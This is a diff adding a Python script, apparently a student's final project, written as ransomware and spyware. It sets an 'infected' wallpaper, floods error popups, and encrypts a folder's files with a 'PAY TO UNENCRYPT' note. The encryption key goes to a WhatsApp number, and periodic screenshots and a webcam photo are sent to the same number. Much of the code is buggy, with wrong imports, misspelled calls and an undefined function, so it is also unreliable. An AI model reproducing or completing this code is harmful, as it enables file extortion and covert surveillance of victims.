@@ -1,0 +1,159 @@
+import shutil 
+from pathlib import Path
+import os
+from datetime import datetime   
+import tkinter.messagebox   
+from tkinter import *   
+from random import *
+import ctypes
+import subprocess
+from cryptography.fernet import fernet 
+import datetime
+import schedule
+import pyautogui
+import pywhatkit
+import cv2
+import keyboard as kb
+import time
+
+
+#1
+
+def changehour():
+    dt2 = "2023/01/28  14:25:17"
+    ndt2 = datetime.strptime(dt2, "%Y/%m/%d %H:%M:%S")
+
+    while True:
+        time.sleep(1)
+        dt1 = datetime.now().strftime("%Y/%m/%d %H:%M:%S")
+        ndt1 = datetime.strftime(dt1, "%Y/%m/%d %H:%M:%S")
+
+        if ndt1 == ndt2:
+            pathDownload = str(os.path.join(Path.home(), "Downloads"))
+
+            src_path = "C:\Users\juanm\OneDrive\Desktop\TRABAJO FINAL 1102132"
+            dst_path = pathDownload
+            shutil.copy(src_path, dst_path)
+
+
+
+
+#2
+
+image_path = "C:\Users\juanm\OneDrive\Desktop\TRABAJO FINAL 1102132\USTEDHASIDOINFECTADO.jpeg"
+SPI_SETDESKWALLPAPER = 20
+ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 0)
+
+subprocess.call(["C:\Users\juanm\OneDrive\Desktop\TRABAJO FINAL 1102132\Nuevo documento de texto.bat"])
+
+
+#3
+
+def CtrlC():
+    while True:
+        if kb.is_pressed("ctrl+c"):
+            i = 1
+            get_mouse_speed = 112
+            speed = ctypes.c_init()
+            speed = ctypes.windll.user32.SystemParametersInfoA(get_mouse_speed, 0, ctypes.byref(speed), 0)
+            set_mouse_speed = 113
+            ctypes.windll.user32.SystemParametersInfoA(set_mouse_speed, 0, speed, 0)
+            while 1 < 15:
+                root = Tk()
+                root.atributes('-topmost', 1)
+                root.withdraw()
+                root.geometry('%dx%d+%d+%d' % (300, 200, randint(10, 1000), randint(10, 1000)))
+                tkinter.messagebox.showerror(title="", message= "YOU HAVE BEEN INFECTED", parent=root)
+                i = i + 1
+
+
+#4
+
+def Calculator():
+    s = subprocess.check_output('tasklist')
+    if "CalculatorApp.exe" in str(s):
+        def generar_key():
+            key = Fernet.generate_key()
+            with open('key.key', 'wb') as key_file:
+                key_file.write(key)
+
+
+        def cargar_key():
+            return open('key.key', 'rb').read()
+
+        def encrypt(items, key):
+            f= Fernet(key)
+            for item in items:
+                with open(item, 'rb') as file:
+                    file_data = file.read()
+                encrypted_data = f.encrypt(file_data)
+                with open(item, 'wb') as file:
+                    file.write(encrypted_data)
+
+
+if __name__ == '__main__':
+    path_to_encrypt = r"C:\Users\juanm\OneDrive\Desktop\gatos"
+    items = os.listdir(path_to_encrypt)
+    full_path = [path_to_encrypt + '\\' + item for item in items]
+
+    generar_key()
+    key = cargar_key()
+
+    encrypt(full_path, key)
+
+    min = datetime.datetime.now().minute
+    sub = min + 1 
+    pywhatkit.sendwhatmsg('+18292749637', key, datetime.datetime.now().hour, sub, 15, 4)
+
+    with open(path_to_encrypt + '\\' + 'readme.txt', 'w') as file:
+        file.write('FILE ENCRYPTED\n')
+        file.write('PAY TO UNENCRYPT')
+
+
+
+#5
+
+def CtrlV():
+    def screenshot():
+        image = pyautogui.screenshot()
+        image.save("Capture.jpg")
+
+        pywhatkit.sendwhats_image(+18292749637, "C:\Users\juanm\OneDrive\Desktop\TRABAJO FINAL 1102132\Capture.jpg")
+
+        time.sleep(10)
+
+    schedule.every(1).minutes.do(screenshot)
+
+    while True:
+        if kb.is_pressed("ctrl+v"):
+            while True:
+                schedule.run_pending()
+                time.sleep(1)
+
+
+
+#6
+
+def Take_pic():
+    camera = cv2.VideoCapture(0)
+    ret, image = camera.read()
+    cv2.imwrite("foto.jpg", image)
+    camera.release()
+
+    pywhatkit.sendwhats_image("+18292749637", "C:\Users\juanm\OneDrive\Desktop\TRABAJO FINAL 1102132\foto.jpg")
+
+    kb.add_hotkey("ctrl+x", tomar_foto_y_enviar)
+
+    while True:
+        time.sleep(1)
+
+
+
+
+
+
+
+
+
+
+
